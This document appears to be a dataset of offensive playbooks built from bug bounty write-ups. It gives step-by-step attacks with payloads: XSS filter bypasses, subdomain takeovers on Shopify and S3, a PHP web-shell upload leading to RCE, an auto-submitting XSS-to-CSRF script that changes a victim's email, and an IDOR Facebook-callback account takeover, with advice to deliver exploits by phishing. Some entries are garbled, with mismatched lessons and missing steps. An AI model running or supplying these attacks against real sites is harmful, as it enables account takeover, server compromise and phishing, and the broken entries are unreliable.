playbooks.key_lesson: Always scrutinize the usage of `eval()` or similar dynamic code execution functions within user-controlled input, as they are potent sources of code injection and SSRF vulnerabilities.

meta.title: How i found Stored xss on your-domain.redacted.com

tech_stack_fingerprints: your-domain.redacted.com responds with HTML containing JavaScript

trigger_conditions.when_to_apply: When user profile fields (like Name or Alias) are injectable and the application's JavaScript does not properly sanitize or escape script tags in the displayed profile data.
prerequisites: Attacker must have an authenticated user account on the target application.
applicability_signals: The 'Name' and 'Alias' fields in the 'Edit profile Setting' page accept input.
Initial attempts to inject standard `<script>` tags in the 'Full Name' during signup are rejected with 'Invalid name on name', suggesting some server-side validation.
Source code analysis reveals JavaScript that might be intended to block script execution, but the payload can bypass it.
skip_if: All input fields are strictly sanitized and do not reflect any payload.
WAF or input validation completely blocks the bypass payload.

recon_steps: Step 1: Register a new user account on the target application.
Step 2: Navigate to the 'Edit profile Setting' page after registration.
Step 3: Analyze the HTML source code of the profile settings page and dashboard to identify any JavaScript that might be involved in rendering user data or preventing XSS.
attack_steps: Step 1: Attempt to inject a basic XSS payload like `<script>alert(1)</script>` into the 'Name' field on the 'Edit profile Setting' page.
Step 2: Save the profile changes.
Step 3: Navigate to the dashboard or any page where the profile name is displayed to check for XSS execution.
Step 4: If the basic payload fails, re-examine the source code for specific JavaScript blocking mechanisms or filtering logic.
Step 5: Craft a payload that bypasses the identified filtering, such as `</script><script>alert(document.domain);</script>` to break out of any existing script context and inject a new one.
Step 6: Inject the crafted bypass payload into the 'Name' or 'Alias' field.
Step 7: Save the profile changes.
Step 8: Return to the dashboard to verify if the XSS payload executes.
payloads_or_patterns: \x3c/script\x3e\x3cscript\x3ealert(document.domain)\x3c/script\x3e
tools_recommended: Burp Suite or similar proxy to intercept and modify HTTP requests.
Browser's developer tools to inspect HTML source and JavaScript.
success_indicators: An alert box displaying `your-domain.redacted.com` appears on the dashboard after saving the profile with the payload.
failure_indicators: No alert box appears, and the profile data is displayed without execution.
An error message is displayed upon saving, indicating invalid input.
HTTP 400 or 500 errors on saving the profile.

playbooks.impact: Attacker can execute arbitrary JavaScript in the context of other authenticated users visiting the dashboard or any page displaying the profile name. This can lead to session hijacking, phishing, defacement, or stealing sensitive information.
playbooks.key_lesson: When user-provided input is reflected in a web page, always test for stored XSS by attempting to break out of existing script tags or context using payloads designed to bypass common filtering mechanisms.

meta.title: Subdomain Takeover via Shopify Vendor (blog.exchangemarketplace.com) with Steps

trigger_conditions.when_to_apply: When a subdomain points to Shopify but is not actively configured with a Shopify store, allowing for its takeover.
prerequisites: The target subdomain is configured to point to Shopify (e.g., via CNAME records).
applicability_signals: Visiting the vulnerable subdomain directly results in a prompt to connect the domain to a Shopify store.
Tools like Aquatone identify subdomains but don't explicitly flag them as vulnerable to takeover.
skip_if: The subdomain is already properly configured with a Shopify store or another service.
The DNS records for the subdomain do not point to Shopify infrastructure.

recon_steps: Step 1: Identify subdomains associated with Shopify merchants using subdomain enumeration tools (e.g., Subfinder, Amass, Aquatone).
Step 2: Visit identified subdomains directly in a browser. Look for pages that prompt for domain connection to a Shopify store.
attack_steps: Step 1: Create a free trial account on Shopify.
Step 2: Navigate to the 'Settings' -> 'Domains' section of your new Shopify store (e.g., https://your-shop.myshopify.com/admin/settings/domains).
Step 3: Click 'Connect existing domain'.
Step 4: Enter the vulnerable subdomain (e.g., blog.exchangemarketplace.com) and click 'Verify' or 'Connect'.
Step 5: Wait for the configuration to propagate.
payloads_or_patterns: vulnerable subdomain: blog.exchangemarketplace.com
tools_recommended: Subdomain enumeration tools (Subfinder, Amass)
Aquatone
Burp Suite (for manual verification and analysis)
Shopify free trial account
success_indicators: The vulnerable subdomain now redirects to your newly created Shopify store.
Accessing the vulnerable subdomain via its URL directly loads your Shopify store content.
failure_indicators: The subdomain continues to resolve to a different service or shows an error page unrelated to Shopify domain connection.
Shopify's system rejects the domain connection attempt due to existing configuration or validation errors. -> Re-verify DNS records and Shopify's requirements.

playbooks.impact: Attacker gains control of a subdomain, potentially hosting malicious content or phishing pages, impacting the reputation of the original domain owner and the associated platform (Shopify).
playbooks.key_lesson: When a subdomain points to a platform like Shopify and is not actively configured, attempt to claim it by creating a new account on the platform and connecting the subdomain.

meta.title: How I got $4000 from Visma for RCE

trigger_conditions.when_to_apply: When a target is identified as using a WordPress site and a specific theme (Konzept) with the Uploadify script is present.
prerequisites: Target is using WordPress.
Target is using the 'konzept' theme.

The endpoint `/wp-content/themes/konzept/includes/uploadify/uploadify.php` is accessible.

Step 2: Navigate to `https://<TARGET_SUBDOMAIN>/wp-content/themes/konzept/includes/uploadify/uploadify.php` to confirm the presence and accessibility of the Uploadify script.

payloads_or_patterns: c99.php (or any other PHP web shell)
tools_recommended: Google Search (for dorking)
Burp Suite (to monitor requests and craft payloads)
success_indicators: Successful upload of the shell file.
Access to the uploaded shell at `https://<TARGET_SUBDOMAIN>/wp-content/themes/konzept/includes/uploadify/uploads/<SHELL_FILENAME>`.
Execution of commands through the shell.

The uploaded file is not accessible or does not execute commands.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing the attacker to execute arbitrary commands, access sensitive data, and potentially take full control of the server.
playbooks.key_lesson: Always test file upload functionalities, especially those found in older or unmaintained WordPress themes and plugins, as they can lead to arbitrary file upload and RCE.

meta.title: [XSS] survey.dropbox.com

trigger_conditions.when_to_apply: When a subdomain of a trusted domain (e.g., dropbox.com) is used to serve content from a third-party service (e.g., mysurveylab.com), and that third-party service is vulnerable to XSS.
prerequisites: The target domain (survey.dropbox.com) must be serving content from a vulnerable third-party service (mysurveylab.com).
applicability_signals: Observing that survey.dropbox.com redirects or embeds content from mysurveylab.com.
Identifying XSS vulnerabilities within mysurveylab.com forms.
skip_if: The third-party service (mysurveylab.com) is not vulnerable to XSS.
The integration between survey.dropbox.com and mysurveylab.com does not allow for the execution of injected payloads.

recon_steps: Step 1: Navigate to survey.dropbox.com and observe its behavior. Identify if it redirects to or embeds content from a third-party service, specifically mysurveylab.com.
Step 2: Analyze mysurveylab.com for potential XSS vulnerabilities in its form creation or rendering functionalities. Use common XSS payloads to test input fields.
attack_steps: Step 1: If mysurveylab.com forms are vulnerable to XSS, create a malicious form on mysurveylab.com containing an XSS payload.
Step 2: Craft a URL that accesses this malicious form via survey.dropbox.com.
Step 3: Share the crafted URL with a target user.
payloads_or_patterns: A generic XSS payload like <script>alert(document.domain)</script> or a more sophisticated payload designed to steal cookies or redirect the user, depending on the specific vulnerability in mysurveylab.com.
tools_recommended: Burp Suite or OWASP ZAP for intercepting and modifying requests, and for scanning for XSS vulnerabilities on mysurveylab.com.
Browser developer tools for inspecting page source and JavaScript execution.
success_indicators: Execution of the injected JavaScript (e.g., an alert box appearing with the domain 'survey.dropbox.com').
If the XSS is stored and can be triggered by other users visiting the embedded form via survey.dropbox.com.
failure_indicators: The XSS payload is not executed, or the payload is neutralized by input sanitization or a Content Security Policy (CSP) implemented by mysurveylab.com or survey.dropbox.com.
If the vulnerability only exists on mysurveylab.com and is not reflected or stored when accessed through survey.dropbox.com.

playbooks.impact: Execution of arbitrary JavaScript in the context of survey.dropbox.com, allowing for potential session hijacking, credential theft (phishing), or performing actions on behalf of the user within the scope of survey.dropbox.com.
playbooks.key_lesson: Subdomains that serve third-party content are susceptible to XSS if the third-party service is vulnerable; always verify the security of embedded third-party content.

meta.title: Subdomain Takeover via Unsecured S3 Bucket Connected to the Website

affected_components: S3 bucket configured as a website origin
tech_stack_fingerprints: Access Denied error from AWS CLI

trigger_conditions.when_to_apply: When a subdomain returns a 404 error with a 'NoSuchKey' code, indicating a potential S3 origin, and an S3 bucket associated with the subdomain is found to be misconfigured, allowing file uploads.
prerequisites: The target subdomain is associated with an Amazon S3 bucket.
The S3 bucket has insecure policies that allow unauthorized file uploads.
The missing file that causes the 404 error is known or can be inferred (e.g., '_redirect.html').
applicability_signals: 404 error response containing 'NoSuchKey' and the name of a missing file.
The subdomain name appears to be a valid S3 bucket name.
AWS CLI commands like `aws s3 ls s3://<subdomain>/` return 'Access Denied' but `aws s3 cp` to the bucket is successful.
skip_if: The S3 bucket is properly configured with a restrictive policy that denies all unauthorized uploads.
The subdomain is not using an S3 bucket for its content.
The AWS CLI `cp` command to the suspected S3 bucket consistently fails with an access denied error.

recon_steps: Step 1: Visit the target subdomain to confirm the 404 error and note the 'NoSuchKey' error message, paying attention to the name of the missing file.
Step 2: Attempt to list the contents of a potential S3 bucket named after the subdomain using `aws s3 ls s3://<TARGET_SUBDOMAIN>/`. Note any 'Access Denied' errors.
Step 3: Use `aws s3 cp` to attempt uploading a dummy file (e.g., `test.txt`) to the suspected S3 bucket: `aws s3 cp test.txt s3://<TARGET_SUBDOMAIN>/`. Observe success or failure.
attack_steps: Step 1: Create the necessary file (e.g., `_redirect.html`) with malicious content (e.g., a JavaScript redirect).
Step 2: Upload the created file to the target S3 bucket with public read access: `aws s3 cp _redirect.html s3://<TARGET_SUBDOMAIN>/ --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers`.
Step 3: Access the target subdomain in a web browser to verify that the uploaded file is served and executed as the index page.
payloads_or_patterns: File content for `_redirect.html`: `<html><head><meta http-equiv="refresh" content="0; url=https://attacker-controlled-site.com/"></head><body></body></html>` (or similar redirect logic)
AWS CLI command: `aws s3 cp <LOCAL_FILE_PATH> s3://<TARGET_SUBDOMAIN>/ --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers`
tools_recommended: AWS CLI: For interacting with S3 buckets, uploading files, and managing permissions.
Text editor: For creating the `_redirect.html` file.
Web browser: For verifying the exploit and observing the redirect.
success_indicators: The target subdomain no longer shows a 404 error.
The browser is redirected to the attacker-controlled site specified in the `_redirect.html` file.
The content of `_redirect.html` is visible or executed when accessing the subdomain directly.
failure_indicators: The `aws s3 cp` command to upload the file fails with an 'Access Denied' error, even with the `--grants` flag.
After uploading the file, the subdomain still shows a 404 error or an 'Access Denied' error for the uploaded file.
The S3 bucket policy prevents granting public read access to uploaded objects.

playbooks.impact: The attacker can take full control of the subdomain by serving arbitrary content, which can be used for phishing, distributing malware, or redirecting users to malicious websites, effectively impersonating the legitimate site.
playbooks.key_lesson: Always ensure S3 buckets serving website content have restrictive bucket policies that deny public access by default and explicitly grant only necessary permissions.

meta.title: Responsible disclosure: retrieving a user's private Facebook friends

affected_components: Instagram signup and friend suggestion feature
Account linking between Facebook and Instagram
tech_stack_fingerprints: Instagram user suggestion based on linked accounts

trigger_conditions.when_to_apply: When a target user has an existing Facebook account and a new Instagram account can be created using the same email address, and Instagram allows access to features before email confirmation.
prerequisites: Attacker knows the target user's email address.
Target user has a Facebook account.
Instagram allows account creation with an existing Facebook-linked email without immediate verification.
Instagram's friend suggestion feature is available before email confirmation.
applicability_signals: Instagram allows creating an account using an email address that is also associated with a Facebook account.
Instagram provides friend suggestions before the user confirms their email address.
skip_if: Instagram requires email confirmation before providing any user suggestions.
Instagram does not link or suggest friends based on Facebook accounts during initial signup.
The target user's email address is not known to the attacker.

recon_steps: Step 1: Identify the target user's email address.
Step 2: Attempt to create a new Instagram account using the target user's email address.
attack_steps: Step 1: Sign up for a new Instagram account using the target's email address and a dummy password.
Step 2: Upon account creation, navigate to the 'suggested users to follow' or similar section.
Step 3: Observe the list of suggested users, which will include the target's private Facebook friends.
payloads_or_patterns: Instagram signup form with email: <TARGET_EMAIL>
Any subsequent requests to the Instagram API related to user suggestions
tools_recommended: Web browser for manual signup and exploration.
Potentially Burp Suite to intercept and analyze traffic if deeper API interaction is suspected.
success_indicators: The 'suggested users to follow' list on Instagram contains individuals who are known to be private friends of the target on Facebook, and who are not publicly connected otherwise.
The suggested users are specifically linked to the target's Facebook friend list, not just generic popular accounts or people the attacker might know.
failure_indicators: Instagram prevents account creation with the target's email address.
Instagram requires email confirmation before showing any friend suggestions.
The suggested users are irrelevant to the target's Facebook friend list.
The suggested users are a generic set of popular accounts or accounts the attacker already knows.

playbooks.impact: An attacker can obtain a list of a Facebook user's private friends by leveraging the integration between Facebook and Instagram, even if the attacker is not a Facebook friend of the target or has no direct connection to them. This bypasses Facebook's privacy settings.
playbooks.key_lesson: Always verify that sensitive data, such as friend lists, is properly protected even in flows that appear unrelated or are intended for user convenience, especially when integrating with other platforms.

meta.title: R-XSS -> CSRF bypass to account takeover

trigger_conditions.when_to_apply: When a website has a reflected XSS vulnerability that is only triggered when a user is logged in, and a CSRF vulnerability that allows changing sensitive account settings.
prerequisites: User must be authenticated.
Reflected XSS vulnerability must exist in a parameter that can be controlled by an attacker.
CSRF vulnerability must exist in a function that can change account details and is not protected by SameSite cookies or other robust CSRF defenses.
applicability_signals: Existence of reflected XSS on the target.
Existence of sensitive account modification endpoints that are susceptible to CSRF.
skip_if: XSS payload is not reflected when authenticated.
Sensitive account modification endpoints have strong CSRF protection (e.g., unpredictable tokens validated correctly, SameSite=Strict cookies).

recon_steps: Step 1: Identify reflected XSS vulnerabilities by testing various parameters with common XSS payloads (e.g., <script>alert(1)</script>). Check if the payload is reflected in the response and executes in the browser, especially when logged in.

Step 2: Identify account modification functionalities (e.g., change email, change password, change profile details) that are accessible to authenticated users. Test these endpoints for CSRF by attempting to modify details using a simple HTML form without explicit CSRF tokens and observe if the changes are applied.
attack_steps: Step 1: Craft a malicious link or form that embeds the reflected XSS payload. This payload should aim to trigger an action that leads to the CSRF vulnerability.

Step 2: Combine the XSS payload with the CSRF exploit. For example, the XSS could dynamically generate a form with a CSRF vulnerable action and submit it automatically, or it could redirect the user to a crafted URL that triggers the CSRF.
Step 3: Trick the victim user into visiting the crafted malicious link or submitting the generated form. This is often done through phishing emails or social engineering.
Step 4: Observe the results of the combined attack. If successful, the attacker can take over the victim's account by changing sensitive information like email or password.
payloads_or_patterns:
Example XSS leading to CSRF form submission:
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '<TARGET_URL>/change_email', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  // Assume the server doesn't validate CSRF tokens for this endpoint or XSS can bypass it
  xhr.send('email=<ATTACKER_CONTROLLED_EMAIL>&password=<USER_PASSWORD>'); // Password might be obtainable via other means or not required
</script>

Alternatively, using a form:
<form action='<TARGET_URL>/change_email' method='POST'>
  <input type='hidden' name='email' value='<ATTACKER_CONTROLLED_EMAIL>'>
  <input type='hidden' name='password' value='<USER_PASSWORD>'>
  <script>document.forms[0].submit();</script>
</form>
tools_recommended: Burp Suite (for identifying XSS and CSRF vulnerabilities)
Custom scripts (for crafting combined XSS-CSRF payloads)
Phishing/social engineering tools (for delivering the exploit)
success_indicators: Victim's email or password is changed to attacker-controlled values.
Attacker can now log into the victim's account.
XSS payload executes as expected, and the subsequent CSRF action is performed without user interaction beyond the initial click/load.
failure_indicators: XSS payload does not execute or is not reflected when logged in.
CSRF vulnerable endpoint requires a valid CSRF token that cannot be bypassed by the XSS.
Account changes are blocked by security measures (e.g., email confirmation required for changes, account lockouts).
Pivot: If CSRF is well-protected, focus on exploiting XSS for other impacts if possible, or look for different CSRF vectors.

playbooks.impact: Complete account takeover, allowing the attacker to access sensitive user data, perform actions on behalf of the user, and potentially escalate privileges or cause further damage.
playbooks.key_lesson: Always test reflected XSS in conjunction with other vulnerabilities like CSRF, as the XSS can be used to bypass user interaction requirements for secondary exploits like account takeover.

meta.title: Bypassing Firebase authorization to create custom goo.gl subdomains

trigger_conditions.when_to_apply: When a user is setting up a new subdomain for Firebase Dynamic Links and can observe API calls related to domain creation.
prerequisites: Attacker has an authenticated Firebase account.
applicability_signals: Presence of `/v1/checkValidDomainForProject` API endpoint.
Presence of `/v1/createDomainForProject` API endpoint.
Observation of `domainUriPrefix` parameter in API requests related to domain creation.
skip_if: The system implements strict validation on the `domainUriPrefix` parameter, only allowing pre-approved Google-owned domains for `app.goo.gl`.

recon_steps: Step 1: Navigate to the Firebase Dynamic Links console and initiate the process of setting up a new subdomain. Observe network traffic using browser developer tools or an intercepting proxy.

Step 2: Identify API calls made during the subdomain creation process, specifically looking for endpoints related to domain validation and creation, such as `/v1/checkValidDomainForProject` and `/v1/createDomainForProject`.
attack_steps: Step 1: Send a POST request to `/v1/checkValidDomainForProject` with a desired subdomain and `domainUriPrefix` set to `app.goo.gl`. Observe the response.
Step 2: If the response indicates the domain is valid and available, proceed to send a POST request to `/v1/createDomainForProject` with the same parameters.

Step 3: Modify the `domainUriPrefix` parameter in the `/v1/createDomainForProject` request from `page.link` to `app.goo.gl` while keeping the desired custom subdomain prefix. Send the modified request.
Step 4: Verify if a custom `*.app.goo.gl` subdomain is successfully created and associated with the attacker's Firebase project.
payloads_or_patterns:
POST /v1/checkValidDomainForProject
Host: firebase.google.com
Content-Type: application/json

{ "domainUriPrefix": "<custom_prefix>.app.goo.gl", "projectId": "<your_project_id>" }

POST /v1/createDomainForProject
Host: firebase.google.com
Content-Type: application/json

{ "domainUriPrefix": "<custom_prefix>.app.goo.gl", "projectId": "<your_project_id>" }
tools_recommended: Burp Suite: Intercept and modify HTTP requests during the subdomain creation process.
Browser Developer Tools: Observe network requests and responses.
success_indicators: A response of 200 OK from `/v1/createDomainForProject` after modifying the `domainUriPrefix` to `app.goo.gl`.
The newly created custom subdomain (`<custom_prefix>.app.goo.gl`) appears in the Firebase project settings and is functional for creating short links.
failure_indicators: A 4xx or 5xx error response from `/v1/createDomainForProject` indicating that the `app.goo.gl` domain prefix is not allowed.
The custom subdomain is not created or is not functional, indicating the validation logic correctly prevents this bypass.

playbooks.impact: An attacker can create custom subdomains under `app.goo.gl`, which are intended for official Google products. This could lead to phishing attacks, brand impersonation, or potentially other abuse by directing traffic to attacker-controlled content under a seemingly legitimate Google domain.
playbooks.key_lesson: Always validate that the `domainUriPrefix` parameter is restricted to its intended use cases, especially when dealing with critical subdomains like `app.goo.gl`, to prevent unauthorized sub-domain creation.

meta.title: Shopify Athena Bug

affected_components: Athena (likely an internal tool or feature related to user account management/authentication)
tech_stack_fingerprints: Shopify login page structure and text

trigger_conditions.when_to_apply: When the target presents a user interface for account recovery or identity verification that may be vulnerable to information leakage.
applicability_signals: Presence of account recovery or sign-in assistance features on the target website.
skip_if: The account recovery process strictly validates user identity without revealing any PII or internal account details.

recon_steps: Step 1: Navigate to the Shopify login page (<TARGET_URL>).
Step 2: Identify and interact with any 'Forgot email', 'Forgot password', or similar account recovery/assistance links.
attack_steps: Step 1: On the account recovery page, attempt to enter a known email address or phone number associated with a Shopify account.
Step 2: Observe the response from the server. Look for any indicators that reveal information about the account's existence or internal details that should not be publicly disclosed.
Step 3: If specific account details are revealed, attempt to correlate these with other known Shopify accounts or use this information for further enumeration.
payloads_or_patterns: <TARGET_URL>/account/login/password/reset
tools_recommended: Manual browser testing for initial observation.
Burp Suite to analyze HTTP requests and responses.
success_indicators: The server responds with details of the account (e.g., username, associated services, or internal identifiers) without requiring full authentication or successful recovery.
Information leakage that could aid in further attacks such as social engineering or credential stuffing.

Rate limiting or CAPTCHA challenges after multiple attempts. → Use slower, more targeted probing.

meta.title: Bypassing Authentication Using Javascript Debugger

trigger_conditions.when_to_apply: When the login mechanism relies on client-side JavaScript for authentication validation and a specific JavaScript function related to data comparison is identifiable.
prerequisites: The target application utilizes JavaScript for its authentication flow.
applicability_signals: JavaScript events are generated when interacting with the login button.
Relevant JavaScript files (.js) can be accessed.
skip_if: Authentication logic is entirely server-side.
No identifiable JavaScript functions related to authentication data comparison are found in accessible .js files.

recon_steps: Step 1: Browse the target website and interact with the login mechanism to observe generated JavaScript events.
Step 2: Inspect all loaded JavaScript files (.js) for functions related to authentication, particularly those involving data comparison.
attack_steps: Step 1: Identify the specific JavaScript function responsible for data comparison within the authentication process (e.g., found in 'facebook.js' as per writeup).
Step 2: Use the browser's developer tools to set a breakpoint on the identified data comparison line within the JavaScript function.
Step 3: Trigger the login process to hit the breakpoint.
Step 4: Once the breakpoint is hit, use the browser's JavaScript console to modify the value of the 'data' variable (or equivalent) to a desired value.
Step 5: Resume script execution and observe the authentication outcome.
payloads_or_patterns: Modify the 'data' variable in the JavaScript console to bypass comparison checks.
tools_recommended: Browser Developer Tools (e.g., Chrome DevTools, Firefox Developer Edition) for setting breakpoints and console manipulation.
success_indicators: Successful bypass of the authentication mechanism, allowing access to authenticated areas of the application without valid credentials.
Response indicating successful login or access to restricted content.
failure_indicators: Breakpoint not hit, indicating the function is not executed or is inaccessible.
Modifying the 'data' variable has no effect on the authentication outcome.
Login fails regardless of modifications.

playbooks.impact: Unauthorized access to authenticated sections of the web application, potentially leading to data exposure or unauthorized actions, depending on the privileges associated with the bypassed authentication.
playbooks.key_lesson: Always inspect client-side JavaScript for authentication logic that can be manipulated via debugging tools to bypass security checks.

meta.title: IDOR User Account Takeover By Connecting My Facebook Account with victims Account

trigger_conditions.when_to_apply: When a web application allows linking a Facebook account and uses a predictable user ID parameter in the callback URL.
prerequisites: Attacker must have their own account on the target web application.
Target web application uses Facebook for authentication/account linking.
Target web application exposes user IDs in observable locations (e.g., S3 bucket URLs).
applicability_signals: The presence of a Facebook authentication callback URL with a `_user_id` parameter.
User IDs are present in URLs of shared user-generated content (e.g., images hosted on S3).
skip_if: User IDs are not exposed in any observable manner.
The `_user_id` parameter is not present in the Facebook callback URL.
WAF blocks requests to the callback endpoint.

recon_steps: Step 1: Create multiple test accounts on the target web application.
Step 2: Identify the Facebook authentication callback URL by initiating the account linking process.
Step 3: Observe requests made during the Facebook account linking process to find the `_user_id` parameter and its value.
Step 4: Identify user-generated content (e.g., images) and analyze their URLs to determine if User IDs are embedded.
Step 5: Confirm if the embedded User ID in content URLs matches the `_user_id` observed in the callback.
attack_steps: Step 1: Initiate the Facebook account linking process from your own attacker account.
Step 2: Intercept the Facebook auth callback request (e.g., using Burp Suite).
Step 3: Identify the `_user_id` parameter in the callback URL.
Step 4: Obtain a victim's User ID by observing their shared content URLs (e.g., S3 bucket URLs).
Step 5: Replace the `_user_id` parameter in the callback URL with the victim's User ID.
Step 6: Forward the modified request.
Step 7: Log in to the target web application with your Facebook account to access the victim's account.
payloads_or_patterns:
GET /login/auth/facebook/callback?linking=true&redirect_uri=https://<TARGET_URL>/account&_user_id=<VICTIM_USER_ID> HTTP/1.1
Host: <TARGET_URL>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: <ATTACKER_SESSION_COOKIE>
Connection: close
Upgrade-Insecure-Requests: 1
Example S3 URL structure: https://<subdomain>.<target_domain>.com/media-uploads/<USER_ID>/<image_identifier>/source/default/1.jpg
tools_recommended: Burp Suite (Proxy, Repeater)
Browser Developer Tools
success_indicators: HTTP 200 OK response to the modified callback request.
Successful login to the target web application using the attacker's Facebook account, now accessing the victim's account.
The 'Linked Accounts' section in the victim's profile now shows the attacker's Facebook account as linked.
failure_indicators: HTTP 400 or 403 response to the modified callback request, indicating the user ID is invalid or permission denied.
Login attempt with Facebook redirects to a generic error page or the attacker's original account.
The 'Linked Accounts' section remains unchanged.

playbooks.impact: Complete account takeover of a victim's account on the target web application by linking it to the attacker's Facebook account. This allows the attacker to access all data and perform any actions available to the victim user.
playbooks.key_lesson: Always check if sensitive identifiers like user IDs are exposed in callbacks or accessible via user-generated content, as they can be leveraged for IDOR vulnerabilities.
